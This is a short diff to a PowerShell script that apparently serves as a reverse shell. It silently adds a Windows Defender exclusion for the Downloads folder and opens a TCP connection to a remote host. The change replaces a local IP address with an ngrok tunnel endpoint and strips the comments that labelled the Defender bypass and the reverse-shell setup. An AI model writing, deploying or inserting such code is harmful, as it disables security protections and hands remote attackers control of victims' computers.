@@ -9,12 +9,11 @@ function Ensure-WindowsPowerShell {
 Ensure-WindowsPowerShell
 
 try {
-    # Attempt Defender Exclusion (will fail silently if not admin)
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 
-    # === Reverse shell setup ===
-    $client = "192.168.0.114"
-    $port = 4444
+    # === Change these ===
+    $client = "0.tcp.ngrok.io"
+    $port = 10976
 
     $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
     $stream = $tcp.GetStream()
